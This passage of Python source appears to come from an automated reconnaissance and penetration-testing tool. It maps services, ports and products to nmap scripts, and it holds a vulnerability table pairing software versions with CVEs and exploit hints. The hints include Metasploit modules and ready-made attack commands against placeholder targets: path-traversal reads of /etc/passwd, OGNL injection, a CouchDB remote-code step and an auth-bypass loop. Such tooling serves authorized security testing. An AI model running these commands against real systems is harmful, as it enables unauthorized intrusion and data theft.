    'cics': ['cics-info', 'cics-enum', 'cics-user-brute', 'cics-user-enum'],
    'vtam': [],
    'drda-as': ['drda-brute', 'drda-info'],
    # ── Monitoring / Management ──
    'nagios-nrpe': ['nrpe-enum'],
    'nrpe': ['nrpe-enum'],
    'zabbix-agent': [],
    'snmp-trap': [],
    'netconf': [],
    'restconf': [],
    # ── Container / Orchestration ──
    'docker': ['docker-version'],
    'docker-registry': ['docker-version'],
    'kubernetes': [],
    'etcd': [],
    'consul': [],
    # ── Version Control ──
    'svnserve': ['svn-brute'],
    'svn': ['svn-brute'],
    'cvspserver': ['cvs-brute', 'cvs-brute-repository'],
    'git': [],
    'mercurial': [],
    # ── Remote Desktop / Display ──
    'X11': ['x11-access'],
    'x11': ['x11-access'],
    'xdmcp': ['xdmcp-discover'],
    'teamviewer': [],
    'citrix': [],
    'pcoip': [],
    # ── Miscellaneous Protocols ──
    'finger': ['finger'],
    'ident': [],
    'auth': [],
    'daytime': ['daytime'],
    'echo': [],
    'chargen': [],
    'discard': [],
    'qotd': [],
    'whois': ['whois-domain', 'whois-ip'],
    'ipmi': ['ipmi-version', 'ipmi-brute', 'ipmi-cipher-zero'],
    'bitcoin': ['bitcoin-info', 'bitcoin-getaddr'],
    'ethereum': [],
    'distccd': ['distcc-cve2004-2687'],
    'pcanywhere': ['pcanywhere-brute'],
    'afp': ['afp-serverinfo', 'afp-showmount', 'afp-ls', 'afp-brute', 'afp-path-vuln'],
    'netbus': ['netbus-info', 'netbus-version', 'netbus-brute', 'netbus-auth-bypass'],
    'hadoop-datanode': ['hadoop-datanode-info'],
    'hadoop-jobtracker': ['hadoop-jobtracker-info'],
    'hadoop-namenode': ['hadoop-namenode-info'],
    'hadoop-tasktracker': ['hadoop-tasktracker-info'],
    'hadoop-secondary-namenode': ['hadoop-secondary-namenode-info'],
    'giop': ['giop-info'],
    'iiop': ['giop-info'],
    'gkrellm': ['gkrellm-info'],
    'ganglia': ['ganglia-info'],
    'hddtemp': ['hddtemp-info'],
    'hnap': ['hnap-info'],
    'ndmp': ['ndmp-version', 'ndmp-fs-info'],
    'nbd': ['nbd-info'],
    'ncp': ['ncp-serverinfo', 'ncp-enum-users'],
    'nntp': ['nntp-ntlm-info'],
    'epmd': ['epmd-info'],
    'socks5': ['socks-auth-info', 'socks-brute', 'socks-open-proxy'],
    'socks4': ['socks-auth-info', 'socks-open-proxy'],
    'socks': ['socks-auth-info', 'socks-brute', 'socks-open-proxy'],
    'squid-http': ['http-open-proxy'],
    'msrpc': ['msrpc-enum', 'rpc-grind'],
    'tcpwrapped': [],
    'unknown': [],
    'voldemort': ['voldemort-info'],
    'ventrilo': ['ventrilo-info'],
    'xmpp-client': ['xmpp-info', 'xmpp-brute'],
    'xmpp-server': ['xmpp-info'],
    'xmpp': ['xmpp-info', 'xmpp-brute'],
    'omp': ['omp2-brute', 'omp2-enum-targets'],
    'dicom': ['dicom-ping', 'dicom-brute'],
    'iscsi': ['iscsi-info', 'iscsi-brute'],
    'isns': [],
    'firebird': ['firebird-brute'],
    'wdb': ['wdb-version'],
    'vxworks-dbg': ['wdb-version'],
    'supermicro-ipmi': ['supermicro-ipmi-conf'],
    'lmtp': [],
    'managesieve': [],
    'wsman': ['http-ntlm-info'],
    'winrm': ['http-ntlm-info'],
    'gopher': [],
    'dpap': ['dpap-brute'],
    'daap': [],
    'websocket': [],
    'quake': [],
    'teamspeak': [],
    'adb': [],
    'tor-control': [],
    'tor-socks': ['socks-auth-info'],
    'erlang-port-mapper': ['epmd-info'],
    'zookeeper': [],
    'ceph': [],
    'glusterfs': [],
    'clamav': [],
    'asterisk': ['iax2-version'],
    'freeswitch': [],
    'openvpn': [],
    'wireguard': [],
    'radius': [],
    'tacacs': [],
    'diameter': [],
    'bgp': [],
    'ospf': [],
    'rip': [],
    'zebra': [],
    'vrrp': [],
    'hsrp': [],
    'mpls': [],
    'ldp': [],
    'bfd': [],
}

# Port-based fallback
PORT_SCRIPTS = {
    # ── Standard Services ──
    7: 'echo', 9: 'discard', 13: 'daytime', 17: 'qotd', 19: 'chargen',
    21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 37: 'time',
    43: 'whois', 49: 'tacacs', 53: 'dns', 69: 'tftp', 79: 'finger',
    80: 'http', 88: 'kerberos-sec', 102: 's7comm',
    110: 'pop3', 111: 'rpcbind', 113: 'ident',
    123: 'ntp', 135: 'msrpc', 139: 'netbios-ssn',
    143: 'imap', 161: 'snmp', 162: 'snmp',
    179: 'bgp', 199: 'smux',
    # ── Secure / Encrypted ──
    389: 'ldap', 443: 'http', 445: 'microsoft-ds',
    465: 'smtp', 500: 'ike', 502: 'modbus',
    512: 'rexec', 513: 'rlogin', 514: 'rsh',
    515: 'printer', 520: 'rip', 548: 'afp', 554: 'rtsp',
    587: 'smtp', 623: 'ipmi', 631: 'ipp', 636: 'ldap',
    # ── 800-999 ──
    873: 'rsync', 902: 'http', 993: 'imap', 995: 'pop3',
    # ── 1000+ ──
    1080: 'socks5', 1099: 'rmiregistry', 1433: 'ms-sql-s',
    1521: 'oracle-tns', 1723: 'pptp', 1812: 'radius', 1813: 'radius',
    1883: 'mqtt', 1911: 'fox',
    # ── 2000+ ──
    2049: 'nfs', 2181: 'zookeeper', 2375: 'docker', 2376: 'docker',
    2404: 'iec-104',
    # ── 3000+ ──
    3000: 'http', 3128: 'squid-http', 3260: 'iscsi',
    3268: 'ldap', 3269: 'ldap', 3306: 'mysql',
    3389: 'ms-wbt-server', 3632: 'distccd', 3690: 'svn',
    # ── 4000+ ──
    4369: 'epmd', 4443: 'http', 4500: 'ike',
    4840: 'opcua', 4848: 'http',
    # ── 5000+ ──
    5000: 'http', 5001: 'http', 5060: 'sip', 5061: 'sip',
    5222: 'xmpp-client', 5269: 'xmpp-server', 5353: 'dns',
    5432: 'postgresql', 5555: 'adb', 5632: 'pcanywhere',
    5672: 'amqp', 5900: 'vnc', 5901: 'vnc',
    5984: 'couchdb', 5985: 'http', 5986: 'http',
    # ── 6000+ ──
    6000: 'x11', 6001: 'x11', 6379: 'redis',
    6443: 'http', 6667: 'irc', 6697: 'irc',
    # ── 7000+ ──
    7001: 'http', 7002: 'http', 7077: 'http', 7474: 'http',
    # ── 8000+ ──
    8000: 'http', 8008: 'http', 8009: 'ajp13',
    8080: 'http', 8081: 'http', 8083: 'http',
    8086: 'http', 8088: 'http', 8090: 'http',
    8161: 'http', 8180: 'http', 8291: 'http',
    8443: 'http', 8500: 'http', 8834: 'http', 8888: 'http',
    # ── 9000+ ──
    9000: 'http', 9042: 'cassandra', 9043: 'http',
    9060: 'http', 9080: 'http', 9090: 'http',
    9100: 'jetdirect', 9200: 'elasticsearch', 9300: 'elasticsearch',
    9389: 'ldap', 9418: 'git', 9999: 'http',
    # ── 10000+ ──
    10000: 'http', 10250: 'http', 10443: 'http',
    11211: 'memcache', 11311: 'http',
    # ── 15000+ ──
    15672: 'http', 16010: 'hbase', 16992: 'http',
    # ── 20000+ ──
    20000: 'dnp3', 27017: 'mongodb', 27018: 'mongodb', 28017: 'http',
    # ── 40000+ ──
    44818: 'enip', 47001: 'http', 47808: 'bacnet',
    50000: 'http', 50070: 'http', 50075: 'http',
    61616: 'activemq',
}

# Product-specific extra scripts
PRODUCT_SCRIPTS = {
    # ── FTP Servers ──
    'proftpd': ['ftp-proftpd-backdoor'],
    'vsftpd': ['ftp-vsftpd-backdoor'],
    'pure-ftpd': [],
    'filezilla': [],
    # ── SSH Servers ──
    'openssh': ['ssh-auth-methods', 'ssh2-enum-algos'],
    'dropbear': ['ssh-auth-methods'],
    'libssh': ['ssh-auth-methods'],
    'bitvise': [],
    # ── Web Servers ──
    'apache': ['http-apache-negotiation', 'http-apache-server-status'],
    'nginx': ['http-server-header'],
    'iis': ['http-iis-webdav-vuln', 'http-iis-short-name-brute'],
    'microsoft-iis': ['http-iis-webdav-vuln', 'http-iis-short-name-brute'],
    'lighttpd': [],
    'caddy': [],
    'litespeed': [],
    'cherokee': [],
    'gunicorn': [],
    'uvicorn': [],
    # ── Java App Servers ──
    'tomcat': ['http-default-accounts'],
    'apache tomcat': ['http-default-accounts'],
    'jetty': [],
    'jboss': ['http-default-accounts'],
    'wildfly': ['http-default-accounts'],
    'weblogic': ['http-default-accounts'],
    'websphere': ['http-default-accounts'],
    'glassfish': ['http-default-accounts'],
    'resin': [],
    'payara': [],
    # ── CMS / Web Apps ──
    'wordpress': ['http-wordpress-enum', 'http-wordpress-users', 'http-wordpress-brute'],
    'drupal': ['http-drupal-enum', 'http-drupal-enum-users'],
    'joomla': ['http-joomla-brute'],
    'magento': [],
    'moodle': [],
    'typo3': [],
    'phpbb': [],
    'mediawiki': [],
    'dokuwiki': [],
    # ── Web Admin / DevOps Tools ──
    'webmin': ['http-vuln-cve2006-3392'],
    'miniserv': ['http-vuln-cve2006-3392'],
    'grafana': ['http-title'],
    'gitlab': ['http-title'],
    'jenkins': ['http-title'],
    'confluence': ['http-title'],
    'kibana': ['http-title'],
    'sonarqube': ['http-title'],
    'nexus': ['http-title'],
    'artifactory': ['http-title'],
    'phpmyadmin': ['http-title'],
    'adminer': [],
    'cockpit': [],
    'portainer': [],
    'rancher': [],
    # ── SMB / CIFS ──
    'samba': [
        'smb-vuln-ms17-010', 'smb-vuln-cve-2017-7494',
        'smb-double-pulsar-backdoor', 'smb-enum-shares', 'smb-enum-users',
    ],
    'windows': ['smb-vuln-ms17-010'],
    # ── IRC ──
    'unrealircd': ['irc-unrealircd-backdoor'],
    'inspircd': [],
    'charybdis': [],
    # ── Mail Servers ──
    'exim': ['smtp-commands', 'smtp-vuln-cve2010-4344'],
    'postfix': ['smtp-commands'],
    'sendmail': ['smtp-commands'],
    'dovecot': [],
    'courier': [],
    'cyrus': [],
    'hmail': [],
    'exchange': [],
    'zimbra': [],
    # ── Databases ──
    'mariadb': ['mysql-info', 'mysql-databases', 'mysql-empty-password'],
    'percona': ['mysql-info', 'mysql-databases', 'mysql-empty-password'],
    'couchdb': ['couchdb-databases', 'couchdb-stats'],
    'rethinkdb': [],
    'arangodb': [],
    # ── Proxy / Load Balancer ──
    'squid': ['http-open-proxy'],
    'haproxy': [],
    'varnish': [],
    'traefik': [],
    'envoy': [],
    # ── Monitoring ──
    'nagios': ['http-default-accounts'],
    'zabbix': [],
    'prometheus': [],
    'icinga': [],
    # ── Network Equipment ──
    'mikrotik': [],
    'routeros': [],
    'cisco': [],
    'junos': [],
    'fortios': [],
    'pfsense': [],
    'opnsense': [],
    'ubiquiti': [],
    # ── Message Brokers ──
    'rabbitmq': ['amqp-info'],
    'activemq': [],
    'mosquitto': ['mqtt-subscribe'],
    # ── Container / Orchestration ──
    'docker': ['docker-version'],
    'containerd': [],
    'podman': [],
    # ── Remote Access ──
    'distcc': ['distcc-cve2004-2687'],
    'pcanywhere': ['pcanywhere-brute'],
    # ── Printing ──
    'cups': ['cups-info', 'cups-queue-info'],
    # ── Industrial ──
    'siemens': ['s7-info'],
    'schneider': [],
    'rockwell': [],
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# KNOWN VULNERABLE VERSIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

VULN_DB = [
    # (product_regex, version_regex, description, cve, exploit_hint)
    (r'proftpd', r'1\.3\.5', 'ProFTPD 1.3.5 mod_copy RCE', 'CVE-2015-3306',
     'Metasploit: exploit/unix/ftp/proftpd_modcopy_exec'),
    (r'proftpd', r'1\.3\.3', 'ProFTPD 1.3.3c telnet IAC buffer overflow', 'CVE-2011-4130',
     'Metasploit: exploit/unix/ftp/proftpd_133c_backdoor'),
    (r'vsftpd', r'2\.3\.4', 'vsftpd 2.3.4 Backdoor Command Execution', 'CVE-2011-2523',
     'Metasploit: exploit/unix/ftp/vsftpd_234_backdoor'),
    (r'apache', r'2\.4\.49', 'Apache 2.4.49 Path Traversal + RCE', 'CVE-2021-41773',
     'curl: curl --path-as-is "http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"'),
    (r'apache', r'2\.4\.50', 'Apache 2.4.50 Path Traversal + RCE', 'CVE-2021-42013',
     'curl: curl --path-as-is "http://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"'),
    (r'openssh', r'7\.2p1', 'OpenSSH 7.2p1 Username Enumeration', 'CVE-2016-6210',
     'Metasploit: auxiliary/scanner/ssh/ssh_enumusers'),
    (r'openssh', r'[5-6]\.\d', 'OpenSSH <7.0 - Possible username enum', 'CVE-2016-6210',
     'Metasploit: auxiliary/scanner/ssh/ssh_enumusers'),
    (r'samba', r'^3\.0\.2[0-5]', 'Samba 3.0.20 usermap_script RCE (root)', 'CVE-2007-2447',
     'Metasploit: exploit/multi/samba/usermap_script'),
    (r'samba', r'^(?:3\.[56]\.|4\.[0-5]\.|4\.6\.[0-4])', 'Samba SambaCry RCE', 'CVE-2017-7494',
     'Metasploit: exploit/linux/samba/is_known_pipename'),
    (r'samba', r'^3\.[0-5]\.', 'Samba Symlink Traversal', 'CVE-2010-0926',
     'Metasploit: auxiliary/admin/smb/samba_symlink_traversal'),
    (r'webmin', r'1\.(8[0-9]|9[01])', 'Webmin <1.920 RCE', 'CVE-2019-15107',
     'Metasploit: exploit/unix/webapp/webmin_backdoor'),
    (r'unrealircd', r'3\.2\.8\.1', 'UnrealIRCd 3.2.8.1 Backdoor', 'CVE-2010-2075',
     'Metasploit: exploit/unix/irc/unreal_ircd_3281_backdoor'),
    (r'drupal', r'[78]\.(([0-4]\d?)|5[0-7])', 'Drupal Drupalgeddon2 RCE', 'CVE-2018-7600',
     'Metasploit: exploit/unix/webapp/drupal_drupalgeddon2'),
    (r'tomcat', r'[4-8]\.', 'Apache Tomcat - Check for default credentials', '',
     'Try: admin:admin, tomcat:tomcat, admin:password, manager:manager'),
    (r'jenkins', r'', 'Jenkins - Check for unauthenticated Script Console', '',
     'Browse: http://TARGET:PORT/script'),
    (r'exim', r'4\.8[6-9]', 'Exim 4.87-4.91 RCE', 'CVE-2019-10149',
     'Metasploit: exploit/unix/smtp/exim4_string_format'),
    (r'microsoft-iis', r'[56]\.', 'IIS 5.x/6.x - Multiple vulns', '',
     'Check: WebDAV, PUT method, short filename brute'),
    (r'mysql', r'5\.[0-5]\.', 'MySQL 5.x - Check empty root password', 'CVE-2012-2122',
     'Try: mysql -h TARGET -u root'),
    (r'redis', r'', 'Redis - Check for no auth', '',
     'Try: redis-cli -h TARGET INFO'),
    (r'mongodb', r'', 'MongoDB - Check for no auth', '',
     'Try: mongo --host TARGET --eval "db.adminCommand({listDatabases:1})"'),
    (r'elasticsearch', r'[1-6]\.', 'Elasticsearch - Check for no auth + RCE', 'CVE-2015-1427',
     'curl http://TARGET:9200/_cat/indices'),
    # ── SSH (additional) ──
    (r'openssh', r'7\.7', 'OpenSSH 7.7 Username Enumeration', 'CVE-2018-15473',
     'Metasploit: auxiliary/scanner/ssh/ssh_enumusers'),
    (r'openssh', r'8\.5p1', 'OpenSSH 8.5p1 Double-Free', 'CVE-2023-25136',
     'Pre-auth memory corruption; limited direct impact'),
    (r'openssh', r'[89]\.\d.*p1', 'OpenSSH RegreSSHion', 'CVE-2024-6387',
     'Check if glibc-based Linux: race condition in SIGALRM handler'),
    (r'libssh', r'0\.[6-8]\.', 'libssh Authentication Bypass', 'CVE-2018-10933',
     'Metasploit: auxiliary/scanner/ssh/libssh_auth_bypass'),
    (r'dropbear', r'201[0-5]\.', 'Dropbear SSH < 2016.72 multiple vulns', 'CVE-2016-7406',
     'searchsploit dropbear'),
    # ── HTTP / Web Servers (additional) ──
    (r'apache', r'2\.4\.(4[89]|50)', 'Apache 2.4.48-50 Path Traversal + RCE', 'CVE-2021-41773',
     'curl --path-as-is "http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"'),
    (r'nginx', r'1\.(4\.[0-6]|[0-3]\.)', 'Nginx < 1.4.7 - Check alias traversal', '',
     'Test: curl http://TARGET/static../etc/passwd (alias misconfiguration)'),
    (r'microsoft-iis', r'6\.0', 'IIS 6.0 WebDAV Buffer Overflow RCE', 'CVE-2017-7269',
     'Metasploit: exploit/windows/iis/iis_webdav_scstoragepathfromurl'),
    (r'microsoft-iis', r'10\.0', 'IIS 10.0 HTTP.sys RCE', 'CVE-2021-31166',
     'Metasploit: auxiliary/dos/http/http_sys_accept'),
    (r'apache tomcat', r'[789]\.', 'Tomcat Ghostcat AJP File Read', 'CVE-2020-1938',
     'Metasploit: auxiliary/admin/http/tomcat_ghostcat'),
    (r'jboss', r'[4-6]\.', 'JBoss 4-6 Java Deserialization RCE', 'CVE-2015-7501',
     'Metasploit: exploit/multi/http/jboss_invoke_deploy'),
    (r'weblogic', r'1[024]\.', 'WebLogic T3/IIOP Deserialization RCE', 'CVE-2019-2725',
     'Metasploit: exploit/multi/misc/weblogic_deserialize'),
    (r'weblogic', r'12\.|14\.', 'WebLogic Admin Console Takeover', 'CVE-2020-14882',
     'curl "http://TARGET:7001/console/css/%252e%252e%252fconsole.portal"'),
    (r'glassfish', r'[34]\.', 'GlassFish Admin Traversal + Default Creds', 'CVE-2017-1000028',
     'Default admin with empty password on port 4848'),
    (r'lighttpd', r'1\.4\.(1\d|2[0-8])', 'Lighttpd < 1.4.29 multiple vulns', '',
     'searchsploit lighttpd'),
    (r'grafana', r'[2-8]\.', 'Grafana < 8.3.0 Arbitrary File Read', 'CVE-2021-43798',
     'curl --path-as-is "http://TARGET:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2fetc/passwd"'),
    (r'kibana', r'[5-6]\.', 'Kibana < 6.6.0 Prototype Pollution RCE', 'CVE-2019-7609',
     'Metasploit: exploit/multi/http/kibana_timelion_prototype_pollution'),
    (r'gitlab', r'(8|9|1[01])\.\d', 'GitLab < 11.4.7 SSRF to RCE', 'CVE-2018-19571',
     'Metasploit: exploit/multi/http/gitlab_file_read_rce'),
    (r'gitlab', r'1[3-5]\.', 'GitLab ExifTool RCE', 'CVE-2021-22205',
     'Metasploit: exploit/multi/http/gitlab_exif_rce'),
    (r'confluence', r'[567]\.', 'Confluence OGNL Injection RCE', 'CVE-2022-26134',
     'curl "http://TARGET/%24%7Bnew+javax.script.ScriptEngineManager().getEngineByName(...)%7D/"'),
    (r'spring', r'[45]\.', 'Spring4Shell RCE (Spring Framework)', 'CVE-2022-22965',
     'Metasploit: exploit/multi/http/spring_framework_rce_spring4shell'),
    (r'phpmyadmin', r'4\.[0-8]\.', 'phpMyAdmin < 4.8.2 LFI to RCE', 'CVE-2018-12613',
     'curl "http://TARGET/phpmyadmin/index.php?target=db_sql.php%253f/../../../etc/passwd"'),
    (r'jetty', r'9\.[0-3]\.', 'Jetty < 9.4 multiple vulns', '',
     'searchsploit jetty'),
    (r'wildfly', r'[89]\.', 'WildFly/JBoss - Check management console default creds', '',
     'Try: admin:admin on port 9990'),
    # ── CMS ──
    (r'drupal', r'7\.([0-4]\d?|5[0-7])', 'Drupal 7 Drupalgeddon2 RCE', 'CVE-2018-7600',
     'Metasploit: exploit/unix/webapp/drupal_drupalgeddon2'),
    (r'drupal', r'8\.[0-5]\.', 'Drupal 8 Drupalgeddon2 RCE', 'CVE-2018-7600',
     'Metasploit: exploit/unix/webapp/drupal_drupalgeddon2'),
    (r'drupal', r'[78]\.', 'Drupal Drupalgeddon3 RCE', 'CVE-2018-7602',
     'Metasploit: exploit/unix/webapp/drupal_drupalgeddon2'),
    (r'joomla', r'[12]\.[05]', 'Joomla < 3.7 SQL Injection', 'CVE-2017-8917',
     'sqlmap -u "http://TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"'),
    # ── SMB / Windows (additional) ──
    (r'microsoft-ds', r'6\.1', 'Windows 7/2008R2 - MS17-010 EternalBlue', 'CVE-2017-0144',
     'Metasploit: exploit/windows/smb/ms17_010_eternalblue'),
    (r'microsoft-ds', r'6\.3', 'Windows 2012R2 - MS17-010 EternalBlue', 'CVE-2017-0144',
     'Metasploit: exploit/windows/smb/ms17_010_eternalblue'),
    (r'microsoft-ds', r'10\.0', 'Windows 10/2016/2019 - Check SMBGhost', 'CVE-2020-0796',
     'Metasploit: exploit/windows/smb/cve_2020_0796_smbghost'),
    # ── Databases (additional) ──
    (r'couchdb', r'[12]\.', 'CouchDB < 2.1.0 RCE via Config Overwrite', 'CVE-2017-12636',
     'curl -X PUT "http://TARGET:5984/_config/query_servers/cmd" -d \'"id"\' '),
    (r'postgresql', r'[89]\.|1[0-5]\.', 'PostgreSQL - Check trust auth + UDF injection', '',
     'psql -h TARGET -U postgres; Check: COPY command, large objects'),
    (r'mariadb', r'5\.[0-5]\.|10\.[0-2]\.', 'MariaDB/MySQL Auth Bypass', 'CVE-2012-2122',
     'for i in $(seq 1 1000); do mysql -u root -h TARGET --password=bad 2>/dev/null; done'),
    (r'riak', r'', 'Riak - No auth HTTP API by default', '',
     'curl http://TARGET:8098/buckets?buckets=true'),
    (r'influxdb', r'[01]\.', 'InfluxDB - Check for no auth', '',
     'curl "http://TARGET:8086/query?q=SHOW+DATABASES"'),
    # ── Industrial / SCADA ──
    (r'modbus', r'', 'Modbus - No authentication by design', '',
     'nmap --script modbus-discover -p 502 TARGET'),
    (r'bacnet', r'', 'BACnet - No authentication by design', '',
     'nmap --script bacnet-info -p 47808 TARGET'),
    (r's7comm', r'', 'S7comm Siemens PLC - No authentication by design', '',
     'nmap --script s7-info -p 102 TARGET'),
    (r'fox', r'', 'Niagara Fox - Default credentials common', '',
     'nmap --script fox-info -p 1911 TARGET'),
    (r'enip', r'', 'EtherNet/IP - No authentication by design', '',
     'nmap --script enip-info -p 44818 TARGET'),
    (r'dnp3', r'', 'DNP3 - No authentication by design', '',
     'nmap -p 20000 --script dnp3-info TARGET (if script available)'),
    # ── Miscellaneous ──
    (r'ipmi', r'2\.0', 'IPMI 2.0 RAKP Authentication Hash Disclosure', 'CVE-2013-4786',
     'Metasploit: auxiliary/scanner/ipmi/ipmi_dumphashes'),
    (r'ipmi', r'', 'IPMI Cipher Zero Authentication Bypass', 'CVE-2013-4786',
     'ipmitool -I lanplus -C 0 -H TARGET -U root -P root user list'),
    (r'docker', r'', 'Docker API - Unauthenticated access check', '',
     'curl http://TARGET:2375/version && curl http://TARGET:2375/containers/json'),
    (r'nrpe', r'[12]\.', 'Nagios NRPE < 3.0 Command Injection', 'CVE-2014-2913',
     'Metasploit: exploit/linux/misc/nagios_nrpe_arguments'),
    (r'distcc', r'', 'DistCC Daemon Command Execution', 'CVE-2004-2687',
     'Metasploit: exploit/unix/misc/distcc_exec'),
    (r'java.rmi|rmiregistry', r'', 'Java RMI Registry Classloader RCE', 'CVE-2011-3556',
     'Metasploit: exploit/multi/misc/java_rmi_server'),
    (r'jdwp', r'', 'JDWP Remote Code Execution (no auth)', '',
     'Tool: jdwp-shellifier.py -t TARGET -p PORT --cmd "id"'),
    (r'ntp', r'', 'NTP monlist Amplification + Info Leak', 'CVE-2013-5211',
     'ntpdc -n -c monlist TARGET'),
    (r'snmp', r'', 'SNMP Default Community Strings', '',
     'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET'),
    (r'tftp', r'', 'TFTP - No authentication by design', '',
     'nmap --script tftp-enum -p 69 TARGET'),
    (r'rsync', r'', 'Rsync - Unauthenticated module access check', '',
     'rsync rsync://TARGET/ && rsync -av rsync://TARGET/MODULE /tmp/rsync_loot'),
    (r'x11', r'', 'X11 - Unauthenticated display access', '',
     'xdpyinfo -display TARGET:0; xwd -root -display TARGET:0 -out /tmp/screen.xwd'),
    (r'vnc', r'', 'VNC - No auth / weak auth check', '',
     'Metasploit: auxiliary/scanner/vnc/vnc_none_auth'),
    (r'finger', r'', 'Finger - User enumeration', '',
     'finger @TARGET && finger root@TARGET && finger admin@TARGET'),
    (r'pcanywhere', r'', 'pcAnywhere - Credential file disclosure', 'CVE-2006-0630',
     'Metasploit: auxiliary/scanner/pcanywhere/pcanywhere_login'),
    (r'afp', r'', 'AFP - Unauthenticated share access check', '',
     'nmap --script afp-showmount -p 548 TARGET'),
    (r'hadoop', r'', 'Hadoop - Unauthenticated WebUI/REST API', '',
     'curl http://TARGET:50070/dfshealth.html; curl http://TARGET:8088/cluster/apps'),
    (r'cups', r'1\.[0-6]\.', 'CUPS < 1.6 multiple vulnerabilities', '',
     'searchsploit cups'),
    (r'netbus', r'', 'NetBus Remote Administration Backdoor', '',
     'Metasploit: exploit/windows/misc/netbus'),
    (r'activemq', r'5\.', 'Apache ActiveMQ < 5.18.3 RCE', 'CVE-2023-46604',
     'Metasploit: exploit/multi/misc/apache_activemq_rce_cve_2023_46604'),
    (r'exchange', r'201[369]|2022', 'Exchange ProxyShell / ProxyLogon', 'CVE-2021-34473',
     'Metasploit: exploit/windows/http/exchange_proxyshell_rce'),
    (r'exim', r'4\.(8[7-9]|9[01])', 'Exim 4.87-4.91 RCE (The Return of the WIZard)', 'CVE-2019-10149',
     'Metasploit: exploit/unix/smtp/exim4_string_format'),
    (r'postfix', r'', 'Postfix - Check for open relay', '',
     'nmap --script smtp-open-relay -p 25 TARGET'),
    (r'sendmail', r'8\.(1[0-3])', 'Sendmail < 8.14 multiple vulns', '',
     'searchsploit sendmail'),
    (r'dovecot', r'[12]\.0', 'Dovecot < 2.1 multiple vulns', '',
     'searchsploit dovecot'),
    (r'squid', r'[2-4]\.', 'Squid Proxy - Open proxy / cache poisoning check', '',
     'curl -x http://TARGET:3128 http://ifconfig.me'),
    (r'zabbix', r'[2-5]\.', 'Zabbix < 5.4 SQL Injection / RCE', 'CVE-2021-27927',
     'searchsploit zabbix'),
    (r'mikrotik|routeros', r'6\.[0-3]', 'MikroTik RouterOS Winbox RCE', 'CVE-2018-14847',
     'Metasploit: exploit/linux/misc/mikrotik_winbox_fileread'),
    (r'zimbra', r'[89]\.[0-1]', 'Zimbra RCE via LFI', 'CVE-2019-9670',
     'searchsploit zimbra'),
    (r'sonarqube', r'[7-8]\.', 'SonarQube - Default creds admin:admin', '',
     'Try: http://TARGET:9000 with admin:admin'),
    (r'nexus', r'[23]\.', 'Nexus Repository Manager RCE', 'CVE-2020-36518',
     'searchsploit nexus'),
    (r'openssl', r'1\.0\.1[a-f]', 'OpenSSL Heartbleed', 'CVE-2014-0160',
     'Metasploit: auxiliary/scanner/ssl/openssl_heartbleed'),
    (r'openssl', r'1\.0\.[01]', 'OpenSSL CCS Injection', 'CVE-2014-0224',
     'nmap --script ssl-ccs-injection -p PORT TARGET'),
    (r'openssl', r'0\.9\.[0-8]', 'OpenSSL < 1.0 - Multiple critical vulns', '',
     'Upgrade immediately; check: ssl-poodle, ssl-heartbleed, ssl-dh-params'),
    (r'varnish', r'[1-4]\.', 'Varnish Cache - Check for unprotected admin', '',
     'curl http://TARGET:6082/'),
    (r'cockroachdb', r'', 'CockroachDB - Check for no auth', '',
     'Try: cockroach sql --insecure --host=TARGET'),
    # ── HFS / Rejetto ──
    (r'httpfileserver|rejetto|hfs', r'2\.[23]', 'Rejetto HFS 2.3.x Remote Command Execution', 'CVE-2014-6287',
     'Metasploit: exploit/windows/http/rejetto_hfs_exec'),
    (r'httpfileserver|rejetto|hfs', r'2\.[4-9]', 'Rejetto HFS 2.x Unauthenticated RCE', 'CVE-2024-23692',
     'Metasploit: exploit/windows/http/rejetto_hfs_rce_cve_2024_23692'),
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NSE SCRIPT MANAGEMENT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def find_nse_dir():
    """Find the nmap NSE scripts directory."""
    candidates = [
        Path('/usr/share/nmap/scripts'),
        Path('/snap/nmap/current/usr/share/nmap/scripts'),
        Path('/usr/local/share/nmap/scripts'),
        Path('/opt/homebrew/share/nmap/scripts'),
    ]
    for p in candidates:
        if p.exists():
            return p
    # Try to find via nmap
    try:
        r = subprocess.run(['nmap', '--script-help=default'], capture_output=True, text=True, timeout=5)
        return candidates[0]  # fallback
    except Exception:
        return candidates[0]

NSE_DIR = find_nse_dir()

def nse_exists(name):
    """Check if an NSE script exists."""
    return (NSE_DIR / f"{name}.nse").exists()

def filter_existing_scripts(scripts):
    """Return only scripts that exist on the system."""
    return [s for s in scripts if nse_exists(s)]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TOOL DETECTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TOOL_LIST = [
    'nikto', 'gobuster', 'ffuf', 'dirb', 'enum4linux', 'enum4linux-ng',
    'smbclient', 'smbmap', 'rpcclient', 'snmpwalk', 'snmpcheck', 'onesixtyone',
    'showmount', 'rpcinfo', 'ldapsearch', 'hydra', 'medusa',
    'whatweb', 'wpscan', 'sqlmap', 'searchsploit', 'nuclei',
    'rustscan', 'masscan', 'curl', 'wget', 'ftp', 'nc',
    'sslscan', 'testssl.sh', 'testssl', 'openssl', 'netexec', 'crackmapexec',
    'git', 'nbtscan', 'dig', 'whois', 'redis-cli', 'mongo', 'mysql', 'psql',
    'ike-scan', 'responder', 'impacket-getarch', 'evil-winrm',
    # crawlers / URL & param discovery
